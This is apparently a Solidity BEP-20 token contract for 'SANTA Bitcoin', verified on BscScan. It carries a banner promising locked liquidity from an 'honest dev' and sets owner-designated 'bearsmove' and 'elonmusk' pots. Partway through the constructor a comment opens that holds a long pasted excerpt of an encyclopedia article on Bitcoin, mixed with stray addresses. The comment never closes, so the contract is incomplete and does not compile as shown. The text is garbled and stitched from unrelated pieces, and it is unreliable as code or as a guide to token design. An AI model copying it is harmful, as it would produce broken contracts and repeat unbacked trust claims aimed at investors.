/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: APACHE
/**
 

██████████████████████████████████████████████████
█─▄▄▄▄█─▄─▄─██▀▄─██▄─▄▄▀███▄─▄▄─█─▄▄─█▄─▀─▄█▄─▀─▄█
█▄▄▄▄─███─████─▀─███─▄─▄████─▄███─██─██▀─▀███▀─▀██
▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▀▀▀▄▄▄▀▀▀▄▄▄▄▀▄▄█▄▄▀▄▄█▄▄▀
 
１００％ ＬＰ ＬＯＣＫＥＤ － ＦＲＯＭ ＨＯＮＥＳＴ ＤＥＶ ＴＯ ＳＭＡＲＴ ＴＲＡＤＥＲＳ


*/
pragma solidity ^0.8.0;

interface COINMOON {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `value` tokens are moved from one account (`from`) to  another (`to`). Note that `value` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 value);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract SANTABitcoin is COINMOON {
  
    // common addresses
    address private owner;
    address private bearsmovePot;
    address private elonmuskPot;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public VALOTYOR;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "SANTA Bitcoin";
    string public override symbol = "SANTABTC";
    
    // EVENTS
    // (0x466fDD4567D8483F7D36cEe7e156B047444A9664) event Transfer(address indexed from, address indexed to, uint value);
    // (0x5d87A05164A43372808bE863F5F04f4c2A1B493a) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address bearsmoveAddress, address elonmuskAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        bearsmovePot = bearsmoveAddress;
        elonmuskPot = elonmuskAddress;
        
        // split the tokens according to agreed upon percentages
        VALOTYOR[bearsmovePot] =  totalSupply * 5 / 100;

/**
Units and divisibility
The unit of account of the bitcoin system is the bitcoin. Currency codes for representing bitcoin are BTC[a] and XBT.[b][21]: 2  Its Unicode character is ₿.[1] One bitcoin is divisible to eight decimal places.[7]: ch. 5  Units for smaller amounts of bitcoin are the millibitcoin (mBTC), equal to 1⁄1000 bitcoin, and the satoshi (sat), which is the smallest possible division, and named in homage to bitcoin's creator, representing 1⁄100000000 (one hundred millionth) bitcoin.[2] 100,000 satoshis are one mBTC.[22]
0x8e7b3d23d6d5af17Acc83810A7498298061Eb123
Blockchain
0x85525149C0223CC1AaeFaC6039a39A2b5C7773F2
Data structure of blocks in the ledger

Number of bitcoin transactions per month, semilogarithmic plot[23]

Number of unspent transaction outputs[24]
The bitcoin blockchain is a public ledger that records bitcoin transactions.[25] It is implemented as a chain of blocks, each block containing a cryptographic hash of the previous block up to the genesis block[c] in the chain. A network of communicating nodes running bitcoin software maintains the blockchain.[26]: 215–219  Transactions of the form payer X sends Y bitcoins to payee Z are broadcast to this network using readily available software applications.

Network nodes can validate transactions, add them to their copy of the ledger, and then broadcast these ledger additions to other nodes. To achieve independent verification of the chain of ownership, each network node stores its own copy of the blockchain.[27] At varying intervals of time averaging to every 10 minutes, a new group of accepted transactions, called a block, is created, added to the blockchain, and quickly published to all nodes, without requiring central oversight. This allows bitcoin software to determine when a particular bitcoin was spent, which is needed to prevent double-spending. A conventional ledger records the transfers of actual bills or promissory notes that exist apart from it, but the blockchain is the only place where bitcoins can be said to exist in the form of unspent outputs of transactions.[7]: ch. 5 

Individual blocks, public addresses, and transactions within blocks can be examined using a blockchain explorer.[citation needed]

Transactions
See also: Bitcoin network
Transactions are defined using a Forth-like scripting language.[7]: ch. 5  Transactions consist of one or more inputs and one or more outputs. When a user sends bitcoins, the user designates each address and the amount of bitcoin being sent to that address in an output. To prevent double spending, each input must refer to a previous unspent output in the blockchain.[28] The use of multiple inputs corresponds to the use of multiple coins in a cash transaction. Since transactions can have multiple outputs, users can send bitcoins to multiple recipients in one transaction. As in a cash transaction, the sum of inputs (coins used to pay) can exceed the intended sum of payments. In such a case, an additional output is used, returning the change back to the payer.[28] Any input satoshis not accounted for in the transaction outputs become the transaction fee.[28]

Though transaction fees are optional, miners can choose which transactions to process and prioritize those that pay higher fees.[28] Miners may choose transactions based on the fee paid relative to their storage size, not the absolute amount of money paid as a fee. These fees are generally measured in satoshis per byte (sat/b). The size of transactions is dependent on the number of inputs used to create the transaction and the number of outputs.[7]: ch. 8 

The blocks in the blockchain were originally limited to 32 megabytes in size. The block size limit of one megabyte was introduced by Satoshi Nakamoto in 2010. Eventually, the block size limit of one megabyte created problems for transaction processing, such as increasing transaction fees and delayed processing of transactions.[29] Andreas Antonopoulos has stated Lightning Network is a potential scaling solution and referred to lightning as a second-layer routing network.[7]: ch. 8 

Ownership

Simplified chain of ownership as illustrated in the bitcoin whitepaper.[3] In practice, a transaction can have more than one input and more than one output.[28]
In the blockchain, bitcoins are registered to bitcoin addresses. Creating a bitcoin address requires nothing more than picking a random valid private key and computing the corresponding bitcoin address. This computation can be done in a split second. But the reverse, computing the private key of a given bitcoin address, is practically unfeasible.[7]: ch. 4  Users can tell others or make public a bitcoin address without compromising its corresponding private key. Moreover, the number of valid private keys is so vast that it is extremely unlikely someone will compute a key pair that is already in use and has funds. The vast number of valid private keys makes it unfeasible that brute force could be used to compromise a private key. To be able to spend their bitcoins, the owner must know the corresponding private key and digitally sign the transaction.[d] The network verifies the signature using the public key; the private key is never revealed.[7]: ch. 5 

If the private key is lost, the bitcoin network will not recognize any other evidence of ownership;[26] the coins are then unusable, and effectively lost. For example, in 2013 one user claimed to have lost ₿7,500, worth $7.5 million at the time, when he accidentally discarded a hard drive containing his private key.[32] About 20% of all bitcoins are believed to be lost—they would have had a market value of about $20 billion at July 2018 prices.[33]

To ensure the security of bitcoins, the private key must be kept secret.[7]: ch. 10  If the private key is revealed to a third party, e.g. through a data breach, the third party can use it to steal any associated bitcoins.[34] As of December 2017, around ₿980,000 have been stolen from cryptocurrency exchanges.[35]

Regarding ownership distribution, as of 16 March 2018, 0.5% of bitcoin wallets own 87% of all bitcoins ever mined.[36]

Mining
See also: Bitcoin network § Mining

Early bitcoin miners used GPUs for mining, as they were better suited to the proof-of-work algorithm than CPUs.[37]

Later amateurs mined bitcoins with specialized FPGA and ASIC chips. The chips pictured have become obsolete due to increasing difficulty.

Today, bitcoin mining companies dedicate facilities to housing and operating large amounts of high-performance mining hardware.[38]

Semi-log plot of relative mining difficulty[e][24]
Mining is a record-keeping service done through the use of computer processing power.[f] Miners keep the blockchain consistent, complete, and unalterable by repeatedly grouping newly broadcast transactions into a block, which is then broadcast to the network and verified by recipient nodes.[25] Each block contains a SHA-256 cryptographic hash of the previous block,[25] thus linking it to the previous block and giving the blockchain its name.[7]: ch. 7 [25]

To be accepted by the rest of the network, a new block must contain a proof-of-work (PoW).[25][g] The PoW requires miners to find a number called a nonce (a number used just once), such that when the block content is hashed along with the nonce, the result is numerically smaller than the network's difficulty target.[7]: ch. 8  This proof is easy for any node in the network to verify, but extremely time-consuming to generate, as for a secure cryptographic hash, miners must try many different nonce values (usually the sequence of tested values is the ascending natural numbers: 0, 1, 2, 3, ...) before a result happens to be less than the difficulty target. Because the difficulty target is extremely small compared to a typical SHA-256 hash, block hashes have many leading zeros[7]: ch. 8  as can be seen in this example block hash:

0000000000000000000590fc0f3eba193a278534220b2b37e9849e1a770ca959
By adjusting this difficulty target, the amount of work needed to generate a block can be changed. Every 2,016 blocks (approximately 14 days given roughly 10 minutes per block), nodes deterministically adjust the difficulty target based on the recent rate of block generation, with the aim of keeping the average time between new blocks at ten minutes. In this way the system automatically adapts to the total amount of mining power on the network.[7]: ch. 8  As of April 2022, it takes on average 122 sextillion (122 thousand billion billion) attempts to generate a block hash smaller than the difficulty target.[41] Computations of this magnitude are extremely expensive and utilize specialized hardware.[42]

The proof-of-work system, alongside the chaining of blocks, makes modifications to the blockchain extremely hard, as an attacker must modify all subsequent blocks in order for the modifications of one block to be accepted.[43] As new blocks are being generated continuously, the difficulty of modifying an old block increases as time passes and the number of subsequent blocks (also called confirmations of the given block) increases.[25]

The vast majority of mining power is grouped together in mining pools to reduce variance in miner income. Independent miners may have to work for several years to mine a single block of transactions and receive payment. In a mining pool, all participating miners get paid every time any participant generates a block. This payment is proportionate to the amount of work an individual miner contributed to the pool.[44][better source needed]

Supply

Total bitcoins in circulation[24]
The successful miner finding the new block is allowed by the rest of the network to collect for themselves all transaction fees from transactions they included in the block, as well as a predetermined reward of newly created bitcoins.[45] As of 11 May 2020, this reward is currently ₿6.25 in newly created bitcoins per block.[46] To claim this reward, a special transaction called a coinbase is included in the block, with the miner as the payee.[7]: ch. 8  All bitcoins in existence have been created through this type of transaction. The bitcoin protocol specifies that the reward for adding a block will be reduced by half every 210,000 blocks (approximately every four years). Eventually, the reward will round down to zero, and the limit of ₿21 million[h] is expected to be reached c. 2140 at current rates; the record keeping will then be rewarded by transaction fees only.[47]

Decentralization
Bitcoin is decentralized thus:[5]

Bitcoin does not have a central authority.[5]
The bitcoin network is peer-to-peer,[11] without central servers.
The network also has no central storage; the bitcoin ledger is distributed.[48]
The ledger is public; anybody can store it on a computer.[7]: ch. 1 
There is no single administrator;[5] the ledger is maintained by a network of equally privileged miners.[7]: ch. 1 
Anyone can become a miner.[7]: ch. 1 
The additions to the ledger are maintained through competition. Until a new block is added to the ledger, it is not known which miner will create the block.[7]: ch. 1 
The issuance of bitcoins is decentralized. They are issued as a reward for the creation of a new block.[45]
Anybody can create a new bitcoin address (a bitcoin counterpart of a bank account) without needing any approval.[7]: ch. 1 
Anybody can send a transaction to the network without needing any approval; the network merely confirms that the transaction is legitimate.[49]: 32 
Conversely, researchers have pointed out a "trend towards centralization". Although bitcoin can be sent directly from user to user, in practice intermediaries are widely used.[26]: 220–222  Bitcoin miners join large mining pools to minimize the variance of their income.[26]: 215, 219–222 [50]: 3 [51] Because transactions on the network are confirmed by miners, decentralization of the network requires that no single miner or mining pool obtains 51% of the hashing power, which would allow them to double-spend coins, prevent certain transactions from being verified and prevent other miners from earning income.[52] As of 2013 just six mining pools controlled 75% of overall bitcoin hashing power.[52] In 2014 mining pool Ghash.io obtained 51% hashing power which raised significant controversies about the safety of the network. The pool has voluntarily capped its hashing power at 39.99% and requested other pools to act responsibly for the benefit of the whole network.[53] Around the year 2017, over 70% of the hashing power and 90% of transactions were operating from China.[54]

According to researchers, other parts of the ecosystem are also "controlled by a small set of entities", notably the maintenance of the client software, online wallets, and simplified payment verification (SPV) clients.[52]

Privacy and fungibility
Bitcoin is pseudonymous, meaning that funds are not tied to real-world entities but rather bitcoin addresses. Owners of bitcoin addresses are not explicitly identified, but all transactions on the blockchain are public. In addition, transactions can be linked to individuals and companies through "idioms of use" (e.g., transactions that spend coins from multiple inputs indicate that the inputs may have a common owner) and corroborating public transaction data with known information on owners of certain addresses.[55] Additionally, bitcoin exchanges, where bitcoins are traded for traditional currencies, may be required by law to collect personal information.[56] To heighten financial privacy, a new bitcoin address can be generated for each transaction.[57]

Wallets and similar software technically handle all bitcoins as equivalent, establishing the basic level of fungibility. Researchers have pointed out that the history of each bitcoin is registered and publicly available in the blockchain ledger, and that some users may refuse to accept bitcoins coming from controversial transactions, which would harm bitcoin's fungibility.[58] For example, in 2012, Mt. Gox froze accounts of users who deposited bitcoins that were known to have just been stolen.[59]

Wallets
For broader coverage of this topic, see Cryptocurrency wallet.

Bitcoin Core, a full client

Electrum, a lightweight client
A wallet stores the information necessary to transact bitcoins. While wallets are often described as a place to hold[60] or store bitcoins, due to the nature of the system, bitcoins are inseparable from the blockchain transaction ledger. A wallet is more correctly defined as something that "stores the digital credentials for your bitcoin holdings" and allows one to access (and spend) them. [7]: ch. 1, glossary  Bitcoin uses public-key cryptography, in which two cryptographic keys, one public and one private, are generated.[61] At its most basic, a wallet is a collection of these keys.

Software wallets
The first wallet program, simply named Bitcoin, and sometimes referred to as the Satoshi client, was released in 2009 by Satoshi Nakamoto as open-source software.[11] In version 0.5 the client moved from the wxWidgets user interface toolkit to Qt, and the whole bundle was referred to as Bitcoin-Qt.[62] After the release of version 0.9, the software bundle was renamed Bitcoin Core to distinguish itself from the underlying network.[63][64] Bitcoin Core is, perhaps, the best known implementation or client. Alternative clients (forks of Bitcoin Core) exist, such as Bitcoin XT, Bitcoin Unlimited,[65] and Parity Bitcoin.[66]

There are several modes in which wallets can operate in. They have an inverse relationship with regard to trustlessness and computational requirements.

Full clients verify transactions directly by downloading a full copy of the blockchain (over 150 GB as of January 2018).[67] They are the most secure and reliable way of using the network, as trust in external parties is not required. Full clients check the validity of mined blocks, preventing them from transacting on a chain that breaks or alters network rules.[7]: ch. 1  Because of its size and complexity, downloading and verifying the entire blockchain is not suitable for all computing devices.
Lightweight clients consult full nodes to send and receive transactions without requiring a local copy of the entire blockchain (see simplified payment verification – SPV). This makes lightweight clients much faster to set up and allows them to be used on low-power, low-bandwidth devices such as smartphones. When using a lightweight wallet, however, the user must trust full nodes, as it can report faulty values back to the user. Lightweight clients follow the longest blockchain and do not ensure it is valid, requiring trust in full nodes.[68]
Third-party internet services called online wallets or webwallets offer similar functionality but may be easier to use. In this case, credentials to access funds are stored with the online wallet provider rather than on the user's hardware.[69] As a result, the user must have complete trust in the online wallet provider. A malicious provider or a breach in server security may cause entrusted bitcoins to be stolen. An example of such a security breach occurred with Mt. Gox in 2011.[70]

Cold storage

A paper wallet with a banknote-like design. Both the private key and the address are visible in text form and as 2D barcodes.

A paper wallet with the address visible for adding or checking stored funds. The part of the page containing the private key is folded over and sealed.

A brass token with a private key hidden beneath a tamper-evident security hologram. A part of the address is visible through a transparent part of the hologram.

A hardware wallet peripheral which processes bitcoin payments without exposing any credentials to the computer
Wallet software is targeted by hackers because of the lucrative potential for stealing bitcoins.[34] A technique called "cold storage" keeps private keys out of reach of hackers; this is accomplished by keeping private keys offline at all times[71][7]: ch. 4  by generating them on a device that is not connected to the internet.[72]: 39  The credentials necessary to spend bitcoins can be stored offline in a number of different ways, from specialized hardware wallets to simple paper printouts of the private key.[7]: ch. 10 

Hardware wallets
A hardware wallet is a computer peripheral that signs transactions as requested by the user. These devices store private keys and carry out signing and encryption internally,[71] and do not share any sensitive information with the host computer except already signed (and thus unalterable) transactions.[73] Because hardware wallets never expose their private keys, even computers that may be compromised by malware do not have a vector to access or steal them.[72]: 42–45 

The user sets a passcode when setting up a hardware wallet.[71] As hardware wallets are tamper-resistant,[73][7]: ch. 10  the passcode will be needed to extract any money.[73]

Paper wallets
A paper wallet is created with a keypair generated on a computer with no internet connection; the private key is written or printed onto the paper[i] and then erased from the computer.[7]: ch. 4  The paper wallet can then be stored in a safe physical location for later retrieval.[72]: 39 

Physical wallets can also take the form of metal token coins[74] with a private key accessible under a security hologram in a recess struck on the reverse side.[75]: 38  The security hologram self-destructs when removed from the token, showing that the private key has been accessed.[76] Originally, these tokens were struck in brass and other base metals, but later used precious metals as bitcoin grew in value and popularity.[75]: 80  Coins with stored face value as high as ₿1,000 have been struck in gold.[75]: 102–104  The British Museum's coin collection includes four specimens from the earliest series[75]: 83  of funded bitcoin tokens; one is currently on display in the museum's money gallery.[77] In 2013, a Utah manufacturer of these tokens was ordered by the Financial Crimes Enforcement Network (FinCEN) to register as a money services business before producing any more funded bitcoin tokens.[74][75]: 80 

History
Main article: History of bitcoin
Creation
External images
image icon Cover page of The Times 3 January 2009 showing the headline used in the genesis block
image icon Infamous photo of the two pizzas purchased by Laszlo Hanyecz for ₿10,000


Bitcoin logos made by Satoshi Nakamoto in 2009 (left) and 2010 (right) depict bitcoins as gold tokens
The domain name bitcoin.org was registered on 18 August 2008.[78] On 31 October 2008, a link to a paper authored by Satoshi Nakamoto titled Bitcoin: A Peer-to-Peer Electronic Cash System[3] was posted to a cryptography mailing list.[79] Nakamoto implemented the bitcoin software as open-source code and released it in January 2009.[80][81][11] Nakamoto's identity remains unknown.[10]

No uniform convention for bitcoin capitalization exists; some sources use Bitcoin, capitalized, to refer to the technology and network and bitcoin, lowercase, for the unit of account.[82] The Wall Street Journal,[83] The Chronicle of Higher Education,[84] and the Oxford English Dictionary[13] advocate the use of lowercase bitcoin in all cases.

On 3 January 2009, the bitcoin network was created when Nakamoto mined the starting block of the chain, known as the genesis block.[85][86] Embedded in the coinbase of this block was the text "The Times 03/Jan/2009 Chancellor on brink of second bailout for banks".[11] This note references a headline published by The Times and has been interpreted as both a timestamp and a comment on the instability caused by fractional-reserve banking.[87]: 18 

The receiver of the first bitcoin transaction was Hal Finney, who had created the first reusable proof-of-work system (RPoW) in 2004.[88] Finney downloaded the bitcoin software on its release date, and on 12 January 2009 received ten bitcoins from Nakamoto.[89][90] Other early cypherpunk supporters were creators of bitcoin predecessors: Wei Dai, creator of b-money, and Nick Szabo, creator of bit gold.[85] In 2010, the first known commercial transaction using bitcoin occurred when programmer Laszlo Hanyecz bought two Papa John's pizzas for ₿10,000 from Jeremy Sturdivant.[91][92][93][94][95]

Blockchain analysts estimate that Nakamoto had mined about one million bitcoins[96] before disappearing in 2010 when he handed the network alert key and control of the code repository over to Gavin Andresen. Andresen later became lead developer at the Bitcoin Foundation.[97][98] Andresen then sought to decentralize control. This left opportunity for controversy to develop over the future development path of bitcoin, in contrast to the perceived authority of Nakamoto's contributions.[65][98]

2011–2012
After early "proof-of-concept" transactions, the first major users of bitcoin were black markets, such as Silk Road. During its 30 months of existence, beginning in February 2011, Silk Road exclusively accepted bitcoins as payment, transacting ₿9.9 million, worth about $214 million.[26]: 222 

In 2011, the price started at $0.30 per bitcoin, growing to $5.27 for the year. The price rose to $31.50 on 8 June. Within a month, the price fell to $11.00. The next month it fell to $7.80, and in another month to $4.77.[99]

In 2012, bitcoin prices started at $5.27, growing to $13.30 for the year.[99] By 9 January the price had risen to $7.38, but then crashed by 49% to $3.80 over the next 16 days. The price then rose to $16.41 on 17 August, but fell by 57% to $7.10 over the next three days.[100]

The Bitcoin Foundation was founded in September 2012 to promote bitcoin's development and uptake.[101]

On 1 November 2011, the reference implementation Bitcoin-Qt version 0.5.0 was released. It introduced a front end that used the Qt user interface toolkit.[102] The software previously used Berkeley DB for database management. Developers switched to LevelDB in release 0.8 in order to reduce blockchain synchronization time.[citation needed] The update to this release resulted in a minor blockchain fork on 11 March 2013. The fork was resolved shortly afterwards.[citation needed] Seeding nodes through IRC was discontinued in version 0.8.2. From version 0.9.0 the software was renamed to Bitcoin Core. Transaction fees were reduced again by a factor of ten as a means to encourage microtransactions.[citation needed] Although Bitcoin Core does not use OpenSSL for the operation of the network, the software did use OpenSSL for remote procedure calls. Version 0.9.1 was released to remove the network's vulnerability to the Heartbleed bug.[citation needed]

2013–2016
In 2013, prices started at $13.30 rising to $770 by 1 January 2014.[99]

In March 2013 the blockchain temporarily split into two independent chains with different rules due to a bug in version 0.8 of the bitcoin software. The two blockchains operated simultaneously for six hours, each with its own version of the transaction history from the moment of the split. Normal operation was restored when the majority of the network downgraded to version 0.7 of the bitcoin software, selecting the backwards-compatible version of the blockchain. As a result, this blockchain became the longest chain and could be accepted by all participants, regardless of their bitcoin software version.[103] During the split, the Mt. Gox exchange briefly halted bitcoin deposits and the price dropped by 23% to $37[103][104] before recovering to the previous level of approximately $48 in the following hours.[105]

The US Financial Crimes Enforcement Network (FinCEN) established regulatory guidelines for "decentralized virtual currencies" such as bitcoin, classifying American bitcoin miners who sell their generated bitcoins as Money Service Businesses (MSBs), that are subject to registration or other legal obligations.[106][107][108]

In April, exchanges BitInstant and Mt. Gox experienced processing delays due to insufficient capacity[109] resulting in the bitcoin price dropping from $266 to $76 before returning to $160 within six hours.[110] The bitcoin price rose to $259 on 10 April, but then crashed by 83% to $45 over the next three days.[100]

On 15 May 2013, US authorities seized accounts associated with Mt. Gox after discovering it had not registered as a money transmitter with FinCEN in the US.[111][112] On 23 June 2013, the US Drug Enforcement Administration listed ₿11.02 as a seized asset in a United States Department of Justice seizure notice pursuant to 21 U.S.C. § 881. This marked the first time a government agency had seized bitcoin.[113] The FBI seized about ₿30,000[114] in October 2013 from the dark web website Silk Road, following the arrest of Ross William Ulbricht.[115][116][117] These bitcoins were sold at blind auction by the United States Marshals Service to venture capital investor Tim Draper.[114] Bitcoin's price rose to $755 on 19 November and crashed by 50% to $378 the same day. On 30 November 2013, the price reached $1,163 before starting a long-term crash, declining by 87% to $152 in January 2015.[100]

On 5 December 2013, the People's Bank of China prohibited Chinese financial institutions from using bitcoin.[118] After the announcement, the value of bitcoin dropped,[119] and Baidu no longer accepted bitcoins for certain services.[120] Buying real-world goods with any virtual currency had been illegal in China since at least 2009.[121]

In 2014, prices started at $770 and fell to $314 for the year.[99] On 30 July 2014, the Wikimedia Foundation started accepting donations of bitcoin.[122]

In 2015, prices started at $314 and rose to $434 for the year. In 2016, prices rose and climbed up to $998 by 1 January 2017.[99]

Release 0.10 of the software was made public on 16 February 2015. It introduced a consensus library which gave programmers easy access to the rules governing consensus on the network. In version 0.11.2 developers added a new feature which allowed transactions to be made unspendable until a specific time in the future.[123] Bitcoin Core 0.12.1 was released on 15 April 2016, and enabled multiple soft forks to occur concurrently.[124] Around 100 contributors worked on Bitcoin Core 0.13.0 which was released on 23 August 2016.

In July 2016, the CheckSequenceVerify soft fork activated.[125] In August 2016, the Bitfinex cryptocurrency exchange platform was hacked in the second-largest breach of a Bitcoin exchange platform up to that time, and ₿119,756,[126] worth about $72 million at the time, were stolen.[127]

In October 2016, Bitcoin Core's 0.13.1 release featured the "Segwit" soft fork that included a scaling improvement aiming to optimize the bitcoin blocksize.[citation needed] The patch was originally finalized in April, and 35 developers were engaged to deploy it.[citation needed] This release featured Segregated Witness (SegWit) which aimed to place downward pressure on transaction fees as well as increase the maximum transaction capacity of the network.[128][non-primary source needed] The 0.13.1 release endured extensive testing and research leading to some delays in its release date.[citation needed] SegWit prevents various forms of transaction malleability.[129][non-primary source needed]

2017–2019
Research produced by the University of Cambridge estimated that in 2017, there were 2.9 to 5.8 million unique users using a cryptocurrency wallet, most of them using bitcoin.[130] On 15 July 2017, the controversial Segregated Witness [SegWit] software upgrade was approved ("locked-in"). Segwit was intended to support the Lightning Network as well as improve scalability.[131] SegWit was subsequently activated on the network on 24 August 2017. The bitcoin price rose almost 50% in the week following SegWit's approval.[131] On 21 July 2017, bitcoin was trading at $2,748, up 52% from 14 July 2017's $1,835.[131] Supporters of large blocks who were dissatisfied with the activation of SegWit forked the software on 1 August 2017 to create Bitcoin Cash, becoming one of many forks of bitcoin such as Bitcoin Gold.[132]

Prices started at $998 in 2017 and rose to $13,412.44 on 1 January 2018,[99] after reaching its all-time high of $19,783.06 on 17 December 2017.[133]

China banned trading in bitcoin, with first steps taken in September 2017, and a complete ban that started on 1 February 2018. Bitcoin prices then fell from $9,052 to $6,914 on 5 February 2018.[100] The percentage of bitcoin trading in the Chinese renminbi fell from over 90% in September 2017 to less than 1% in June 2018.[134]

Throughout the rest of the first half of 2018, bitcoin's price fluctuated between $11,480 and $5,848. On 1 July 2018, bitcoin's price was $6,343.[135][136] The price on 1 January 2019 was $3,747, down 72% for 2018 and down 81% since the all-time high.[135][137]

In September 2018, an anonymous party discovered and reported an invalid-block denial-of-server vulnerability to developers of Bitcoin Core, Bitcoin ABC and Bitcoin Unlimited. Further analysis by bitcoin developers showed the issue could also allow the creation of blocks violating the 21 million coin limit and CVE-2018-17144 was assigned and the issue resolved.[138][non-primary source needed]

Bitcoin prices were negatively affected by several hacks or thefts from cryptocurrency exchanges, including thefts from Coincheck in January 2018, Bithumb in June, and Bancor in July. For the first six months of 2018, $761 million worth of cryptocurrencies was reported stolen from exchanges.[139] Bitcoin's price was affected even though other cryptocurrencies were stolen at Coinrail and Bancor as investors worried about the security of cryptocurrency exchanges.[140][141][142] In September 2019 the Intercontinental Exchange (the owner of the NYSE) began trading of bitcoin futures on its exchange called Bakkt.[143] Bakkt also announced that it would launch options on bitcoin in December 2019.[144] In December 2019, YouTube removed bitcoin and cryptocurrency videos, but later restored the content after judging they had "made the wrong call".[145]

In February 2019, Canadian cryptocurrency exchange Quadriga Fintech Solutions failed with approximately $200 million missing.[146] By June 2019 the price had recovered to $13,000.[147]

2020–present

Bitcoin price in US dollars
On 13 March 2020, bitcoin fell below $4,000 during a broad market selloff, after trading above $10,000 in February 2020.[148] On 11 March 2020, 281,000 bitcoins were sold, held by owners for only thirty days.[147] This compared to ₿4,131 that had laid dormant for a year or more, indicating that the vast majority of the bitcoin volatility on that day was from recent buyers. During the week of 11 March 2020, cryptocurrency exchange Kraken experienced an 83% increase in the number of account signups over the week of bitcoin's price collapse, a result of buyers looking to capitalize on the low price.[147] These events were attributed to the onset of the COVID-19 pandemic.

In August 2020, MicroStrategy invested $250 million in bitcoin as a treasury reserve asset.[149] In October 2020, Square, Inc. placed approximately 1% of total assets ($50 million) in bitcoin.[150] In November 2020, PayPal announced that US users could buy, hold, or sell bitcoin.[151] On 30 November 2020, the bitcoin value reached a new all-time high of $19,860, topping the previous high of December 2017.[152] Alexander Vinnik, founder of BTC-e, was convicted and sentenced to five years in prison for money laundering in France while refusing to testify during his trial.[153] In December 2020, Massachusetts Mutual Life Insurance Company announced a bitcoin purchase of US$100 million, or roughly 0.04% of its general investment account.[154]

On 19 January 2021, Elon Musk placed the handle #Bitcoin in his Twitter profile, tweeting "In retrospect, it was inevitable", which caused the price to briefly rise about $5,000 in an hour to $37,299.[155] On 25 January 2021, Microstrategy announced that it continued to buy bitcoin and as of the same date it had holdings of ₿70,784 worth $2.38 billion.[156] On 8 February 2021 Tesla's announcement of a bitcoin purchase of US$1.5 billion and the plan to start accepting bitcoin as payment for vehicles, pushed the bitcoin price to $44,141.[157] On 18 February 2021, Elon Musk stated that "owning bitcoin was only a little better than holding conventional cash, but that the slight difference made it a better asset to hold".[158] After 49 days of accepting the digital currency, Tesla reversed course on 12 May 2021, saying they would no longer take bitcoin due to concerns that "mining" the cryptocurrency was contributing to the consumption of fossil fuels and climate change.[159] The decision resulted in the price of bitcoin dropping around 12% on 13 May.[160] During a July bitcoin conference, Musk suggested Tesla could possibly help bitcoin miners switch to renewable energy in the future and also stated at the same conference that if bitcoin mining reaches, and trends above 50 percent renewable energy usage, that "Tesla would resume accepting bitcoin." The price for bitcoin rose after this announcement.[161]

In June 2021, the Taproot network software upgrade was approved, adding support for Schnorr signatures, improved functionality of Smart contracts and Lightning Network.[162] The upgrade was activated in November.[163]

In September 2021, Bitcoin in El Salvador became legal tender, alongside the US dollar.[164][8]

On 16 October 2021, the SEC approved the ProShares Bitcoin Strategy ETF, a cash-settled futures exchange-traded fund (ETF). The first bitcoin ETF in the United States gained 5% on its first trading day on 19 October 2021.[165][166]

On 25 March 2022, Pavel Zavalny stated that Russia might accept bitcoin for payment for oil and gas exports, in response to sanctions stemming from the 2022 Russian invasion of Ukraine.[167]

On 27 April 2022 Central African Republic adopted bitcoin as legal tender alongside the CFA franc.[168][9]

On May 10, 2022, the bitcoin price fell to $31,324, as a result of a collapse of a UST stablecoin experiment named Terra, with bitcoin down more than 50% since the November 2021 high.[169] By June 13, 2022, the Celsius Network (a decentralized finance loan company) halted withdrawals and resulted in the bitcoin price falling below $20,000.[170][171]

In May 2022, following a vote by Wikipedia editors the previous month, the Wikimedia Foundation announced it would stop accepting donations in bitcoin or other cryptocurrencies—eight years after it had first started taking contributions in bitcoin.[172][173]

Associated ideologies
Satoshi Nakamoto stated in an essay accompanying bitcoin's code that: "The root problem with conventional currencies is all the trust that's required to make it work. The central bank must be trusted not to debase the currency, but the history of fiat currencies is full of breaches of that trust."[174]

Austrian economics roots
According to the European Central Bank, the decentralization of money offered by bitcoin has its theoretical roots in the Austrian school of economics, especially with Friedrich von Hayek in his book Denationalisation of Money: The Argument Refined,[175] in which Hayek advocates a complete free market in the production, distribution and management of money to end the monopoly of central banks.[176]: 22 

Anarchism and libertarianism
Further information: Crypto-anarchism
